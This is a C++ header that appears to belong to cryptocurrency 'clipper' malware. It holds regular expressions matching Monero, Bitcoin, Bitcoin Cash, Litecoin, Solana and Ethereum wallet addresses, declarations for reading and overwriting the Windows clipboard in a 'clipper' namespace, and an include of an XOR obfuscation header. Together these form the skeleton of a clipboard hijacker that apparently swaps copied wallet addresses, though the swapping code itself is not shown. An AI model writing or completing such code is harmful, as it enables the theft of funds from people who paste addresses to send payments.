#pragma once
#include <regex>
#include <windows.h>
#include <string>
#include <iostream>
#include <vector>

#include "../../core/cryptography/xor/xor.h"

enum crypto_type {
    monero,
    bitcoin,
    bitcoin_cash,
    litecoin,
    solana,
    ethereum,
    none,
    crypto_count
};

inline const std::vector<std::pair<crypto_type, std::regex>> crypto_regexes = {
    { monero,       std::regex(R"(^(?:4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}|8[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{94}|4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{104})$)") },

    { bitcoin,      std::regex(R"(^(?:bc1[ac-hj-np-z02-9]{11,87}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$)") },

    { bitcoin_cash, std::regex(R"(^(?:(?:bitcoincash:)?(?:q|p)[0-9a-z]{41}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$)") },

    { litecoin,     std::regex(R"(^(?:ltc1[ac-hj-np-z02-9]{11,87}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})$)") },

    { solana,       std::regex(R"(^[1-9A-HJ-NP-Za-km-z]{32,44}$)") },

    { ethereum,     std::regex(R"(^(?:0x)?[A-Fa-f0-9]{40}$)") }
};


inline bool crypto_flags[crypto_count] = {};

namespace clipper {
    std::string get_clipboard_text();
    bool set_clipboard_text(const std::string& text);
    crypto_type matches_regex(const std::string& input, const std::vector<std::pair<crypto_type, std::regex>>& crypto_regexes);
}